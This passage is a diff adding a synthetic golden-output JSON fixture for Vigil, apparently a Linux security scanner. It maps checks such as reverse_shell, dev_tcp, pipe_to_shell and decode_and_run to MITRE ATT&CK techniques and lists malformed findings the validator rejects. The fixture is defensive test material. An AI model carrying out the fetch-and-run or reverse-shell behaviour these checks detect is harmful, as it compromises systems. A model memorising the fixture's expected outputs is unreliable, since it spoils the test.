@@ -1,0 +1,5007 @@
+{
+ "_note": "SYNTHETIC inputs; outputs computed by Vigil 1 (Python). Regenerate with make_golden.py.",
+ "attack_by_check": {
+  "files/archive_encrypted": [
+   {
+    "id": "T1027.013",
+    "name": "Obfuscated Files or Information: Encrypted/Encoded File",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/013/"
+   }
+  ],
+  "files/archive_setuid": [
+   {
+    "id": "T1548.001",
+    "name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+    "tactic": "privilege-escalation",
+    "url": "https://attack.mitre.org/techniques/T1548/001/"
+   }
+  ],
+  "files/desktop_command": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   },
+   {
+    "id": "T1036.008",
+    "name": "Masquerading: Masquerade File Type",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/008/"
+   }
+  ],
+  "files/desktop_disguise": [
+   {
+    "id": "T1036.008",
+    "name": "Masquerading: Masquerade File Type",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/008/"
+   }
+  ],
+  "files/desktop_download": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   }
+  ],
+  "files/downloads_program": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   }
+  ],
+  "files/inspector_dde": [
+   {
+    "id": "T1559.002",
+    "name": "Inter-Process Communication: Dynamic Data Exchange",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1559/002/"
+   }
+  ],
+  "files/inspector_disguise": [
+   {
+    "id": "T1036.007",
+    "name": "Masquerading: Double File Extension",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/007/"
+   },
+   {
+    "id": "T1036.002",
+    "name": "Masquerading: Right-to-Left Override",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/002/"
+   }
+  ],
+  "files/inspector_download_cradle": [
+   {
+    "id": "T1059.001",
+    "name": "Command and Scripting Interpreter: PowerShell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/001/"
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "files/inspector_embedded_object": [
+   {
+    "id": "T1027.009",
+    "name": "Obfuscated Files or Information: Embedded Payloads",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/009/"
+   }
+  ],
+  "files/inspector_encrypted": [
+   {
+    "id": "T1027.013",
+    "name": "Obfuscated Files or Information: Encrypted/Encoded File",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/013/"
+   }
+  ],
+  "files/inspector_hidden_powershell": [
+   {
+    "id": "T1059.001",
+    "name": "Command and Scripting Interpreter: PowerShell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/001/"
+   },
+   {
+    "id": "T1564.003",
+    "name": "Hide Artifacts: Hidden Window",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1564/003/"
+   }
+  ],
+  "files/inspector_html_smuggling": [
+   {
+    "id": "T1027.006",
+    "name": "Obfuscated Files or Information: HTML Smuggling",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/006/"
+   }
+  ],
+  "files/inspector_lolbin": [
+   {
+    "id": "T1218",
+    "name": "System Binary Proxy Execution",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1218/"
+   }
+  ],
+  "files/inspector_macro_autoexec": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   },
+   {
+    "id": "T1059.005",
+    "name": "Command and Scripting Interpreter: Visual Basic",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/005/"
+   }
+  ],
+  "files/inspector_macro_behaviour": [
+   {
+    "id": "T1059.005",
+    "name": "Command and Scripting Interpreter: Visual Basic",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/005/"
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "files/inspector_macros": [
+   {
+    "id": "T1059.005",
+    "name": "Command and Scripting Interpreter: Visual Basic",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/005/"
+   }
+  ],
+  "files/inspector_pdf_autorun": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   }
+  ],
+  "files/inspector_pdf_embedded": [
+   {
+    "id": "T1027.009",
+    "name": "Obfuscated Files or Information: Embedded Payloads",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/009/"
+   }
+  ],
+  "files/inspector_pdf_javascript": [
+   {
+    "id": "T1059.007",
+    "name": "Command and Scripting Interpreter: JavaScript",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/007/"
+   },
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   }
+  ],
+  "files/inspector_pdf_launch": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   }
+  ],
+  "files/inspector_pdf_obfuscation": [
+   {
+    "id": "T1027",
+    "name": "Obfuscated Files or Information",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/"
+   }
+  ],
+  "files/inspector_persistence": [
+   {
+    "id": "T1053.003",
+    "name": "Scheduled Task/Job: Cron",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1053/003/"
+   }
+  ],
+  "files/inspector_pipe_to_shell": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "files/inspector_remote_object": [
+   {
+    "id": "T1221",
+    "name": "Template Injection",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1221/"
+   }
+  ],
+  "files/inspector_remote_template": [
+   {
+    "id": "T1221",
+    "name": "Template Injection",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1221/"
+   }
+  ],
+  "files/inspector_reverse_shell": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   }
+  ],
+  "files/inspector_rtf_object": [
+   {
+    "id": "T1027.009",
+    "name": "Obfuscated Files or Information: Embedded Payloads",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/009/"
+   }
+  ],
+  "files/inspector_temp_exec": [
+   {
+    "id": "T1222.002",
+    "name": "File and Directory Permissions Modification: Linux and Mac",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1222/002/"
+   }
+  ],
+  "files/inspector_type_mismatch": [
+   {
+    "id": "T1036.008",
+    "name": "Masquerading: Masquerade File Type",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/008/"
+   }
+  ],
+  "files/inspector_xlm_macro": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   }
+  ],
+  "persist/borrowed_name": [
+   {
+    "id": "T1036.005",
+    "name": "Masquerading: Match Legitimate Name or Location",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/005/"
+   },
+   {
+    "id": "T1543.002",
+    "name": "Create or Modify System Process: Systemd Service",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1543/002/"
+   }
+  ],
+  "persist/package_changed": [],
+  "pkg/aur_changed_hands": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/aur_new_account": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/checksum_skip": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/chmod_run": [
+   {
+    "id": "T1222.002",
+    "name": "File and Directory Permissions Modification: Linux and Mac",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1222/002/"
+   },
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   }
+  ],
+  "pkg/decode": [
+   {
+    "id": "T1140",
+    "name": "Deobfuscate/Decode Files or Information",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1140/"
+   }
+  ],
+  "pkg/decode_and_run": [
+   {
+    "id": "T1140",
+    "name": "Deobfuscate/Decode Files or Information",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1140/"
+   },
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   }
+  ],
+  "pkg/desktop_command": [
+   {
+    "id": "T1204.002",
+    "name": "User Execution: Malicious File",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1204/002/"
+   }
+  ],
+  "pkg/dev_tcp": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   },
+   {
+    "id": "T1095",
+    "name": "Non-Application Layer Protocol",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1095/"
+   }
+  ],
+  "pkg/download_to_tmp": [
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/encoded_blob": [
+   {
+    "id": "T1027",
+    "name": "Obfuscated Files or Information",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/"
+   }
+  ],
+  "pkg/eval": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   },
+   {
+    "id": "T1027",
+    "name": "Obfuscated Files or Information",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1027/"
+   }
+  ],
+  "pkg/folder_program": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/hook_network": [
+   {
+    "id": "T1546.016",
+    "name": "Event Triggered Execution: Installer Packages",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1546/016/"
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/install_cron": [
+   {
+    "id": "T1053.003",
+    "name": "Scheduled Task/Job: Cron",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1053/003/"
+   }
+  ],
+  "pkg/install_network": [
+   {
+    "id": "T1546.016",
+    "name": "Event Triggered Execution: Installer Packages",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1546/016/"
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/install_privilege": [
+   {
+    "id": "T1098",
+    "name": "Account Manipulation",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1098/"
+   }
+  ],
+  "pkg/install_service": [
+   {
+    "id": "T1546.016",
+    "name": "Event Triggered Execution: Installer Packages",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1546/016/"
+   },
+   {
+    "id": "T1543.002",
+    "name": "Create or Modify System Process: Systemd Service",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1543/002/"
+   }
+  ],
+  "pkg/install_setuid": [
+   {
+    "id": "T1548.001",
+    "name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+    "tactic": "privilege-escalation",
+    "url": "https://attack.mitre.org/techniques/T1548/001/"
+   }
+  ],
+  "pkg/install_top_level": [
+   {
+    "id": "T1546.016",
+    "name": "Event Triggered Execution: Installer Packages",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1546/016/"
+   }
+  ],
+  "pkg/install_user_add": [
+   {
+    "id": "T1136.001",
+    "name": "Create Account: Local Account",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1136/001/"
+   }
+  ],
+  "pkg/install_user_service": [
+   {
+    "id": "T1543.002",
+    "name": "Create or Modify System Process: Systemd Service",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1543/002/"
+   }
+  ],
+  "pkg/installed_hijack_window": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/installed_known_malicious": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/installed_lookalike": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   },
+   {
+    "id": "T1036.005",
+    "name": "Masquerading: Match Legitimate Name or Location",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/005/"
+   }
+  ],
+  "pkg/known_hijacked": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/known_malicious": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/lookalike_name": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   },
+   {
+    "id": "T1036.005",
+    "name": "Masquerading: Match Legitimate Name or Location",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/005/"
+   }
+  ],
+  "pkg/network_in_build": [
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/new_maintainer": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/pipe_to_shell": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/registry_in_build": [
+   {
+    "id": "T1195.001",
+    "name": "Compromise Software Dependencies and Development Tools",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/001/"
+   }
+  ],
+  "pkg/run_substitution": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/security_off": [
+   {
+    "id": "T1562.001",
+    "name": "Impair Defenses: Disable or Modify Tools",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1562/001/"
+   },
+   {
+    "id": "T1562.004",
+    "name": "Impair Defenses: Disable or Modify System Firewall",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1562/004/"
+   }
+  ],
+  "pkg/source_file_host": [
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   },
+   {
+    "id": "T1102",
+    "name": "Web Service",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1102/"
+   }
+  ],
+  "pkg/source_pastebin": [
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   },
+   {
+    "id": "T1102",
+    "name": "Web Service",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1102/"
+   }
+  ],
+  "pkg/source_raw_ip": [
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/source_shortener": [
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "url": "https://attack.mitre.org/techniques/T1105/"
+   }
+  ],
+  "pkg/srcinfo_mismatch": [
+   {
+    "id": "T1195.002",
+    "name": "Compromise Software Supply Chain",
+    "tactic": "initial-access",
+    "url": "https://attack.mitre.org/techniques/T1195/002/"
+   }
+  ],
+  "pkg/sudo": [
+   {
+    "id": "T1548.003",
+    "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+    "tactic": "privilege-escalation",
+    "url": "https://attack.mitre.org/techniques/T1548/003/"
+   }
+  ],
+  "pkg/top_level_command": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   }
+  ],
+  "pkg/top_level_substitution": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   }
+  ],
+  "pkg/user_service": [
+   {
+    "id": "T1543.002",
+    "name": "Create or Modify System Process: Systemd Service",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1543/002/"
+   }
+  ],
+  "pkg/write_outside": [
+   {
+    "id": "T1546.016",
+    "name": "Event Triggered Execution: Installer Packages",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1546/016/"
+   }
+  ],
+  "tasks/deleted_binary": [
+   {
+    "id": "T1070.004",
+    "name": "Indicator Removal: File Deletion",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1070/004/"
+   }
+  ],
+  "tasks/fake_kernel_name": [
+   {
+    "id": "T1036.004",
+    "name": "Masquerading: Masquerade Task or Service",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/004/"
+   }
+  ],
+  "tasks/hidden_binary": [
+   {
+    "id": "T1564.001",
+    "name": "Hide Artifacts: Hidden Files and Directories",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1564/001/"
+   }
+  ],
+  "tasks/ld_preload": [
+   {
+    "id": "T1574.006",
+    "name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+    "tactic": "persistence",
+    "url": "https://attack.mitre.org/techniques/T1574/006/"
+   }
+  ],
+  "tasks/masquerade_name": [
+   {
+    "id": "T1036.005",
+    "name": "Masquerading: Match Legitimate Name or Location",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1036/005/"
+   }
+  ],
+  "tasks/memory_only": [
+   {
+    "id": "T1620",
+    "name": "Reflective Code Loading",
+    "tactic": "defense-evasion",
+    "url": "https://attack.mitre.org/techniques/T1620/"
+   }
+  ],
+  "tasks/reverse_shell": [
+   {
+    "id": "T1059.004",
+    "name": "Command and Scripting Interpreter: Unix Shell",
+    "tactic": "execution",
+    "url": "https://attack.mitre.org/techniques/T1059/004/"
+   }
+  ]
+ },
+ "attack_persist": [
+  [
+   "systemd",
+   "",
+   "/etc/systemd/system/x.service",
+   [
+    {
+     "id": "T1543.002",
+     "name": "Create or Modify System Process: Systemd Service",
+     "tactic": "persistence",
+     "url": "https://attack.mitre.org/techniques/T1543/002/"
+    }
+   ]
+  ],
+  [
+   "systemd",
+   "",
+   "/x/backup.timer",
+   [
+    {
+     "id": "T1053.006",
+     "name": "Scheduled Task/Job: Systemd Timers",
+     "tactic": "persistence",
+     "url": "https://attack.mitre.org/techniques/T1053/006/"
+    }
+   ]
+  ],
+  [
+   "cron",
+   "boot script",
+   "",
+   [
+    {
+     "id": "T1037.004",
+     "name": "Boot or Logon Initialization Scripts: RC Scripts",
+     "tactic": "persistence",
+     "url": "https://attack.mitre.org/techniques/T1037/004/"
+    }
+   ]
+  ],
+  [
+   "shell",
+   "package manager hook",
+   "",
+   [
+    {
+     "id": "T1546.016",
+     "name": "Event Triggered Execution: Installer Packages",
+     "tactic": "persistence",
+     "url": "https://attack.mitre.org/techniques/T1546/016/"
+    }
+   ]
+  ],
+  [
+   "nope",
+   "",
+   "",
+   []
+  ]
+ ],
+ "broken": [
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: title longer than 60 characters",
+   "name": "title longer"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "Two sentences here. Another one.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: summary must be exactly one sentence",
+   "name": "one sentence"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "Critical",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: severity must be one of ('High', 'Medium', 'Low', 'Info')",
+   "name": "severity"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "Certain",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: confidence must be one of ('High', 'Medium', 'Low')",
+   "name": "confidence"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: a High or Medium finding must say what was noticed (signals)",
+   "name": "signals"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Uses 100% of the CPU",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: title uses '%'",
+   "name": "percent"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Talks to 2001:db8::5 every hour",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: title contains a raw IPv6 address",
+   "name": "ipv6"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "iocs": [
+     {
+      "type": "colour",
+      "value": "red"
+     }
+    ],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: bad indicator {'type': 'colour', 'value': 'red'}",
+   "name": "bad indicator"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "iocs": [
+     {
+      "type": "url",
+      "value": ""
+     }
+    ],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: bad indicator {'type': 'url', 'value': ''}",
+   "name": "bad indicator empty"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "fixes": {
+     "fix": [
+      {
+       "commands": [
+        "sudo pacman -Rns foo"
+       ],
+       "risk": "admin",
+       "title": "Remove it",
+       "undo": [],
+       "what": "Removes the package."
+      }
+     ],
+     "osr": "arch"
+    },
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: fix 'Remove it' has no undo",
+   "name": "fix without undo"
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "Nope",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "Bad",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "no stop",
+    "title": "",
+    "tool": "pkg",
+    "when": 1000.0
+   },
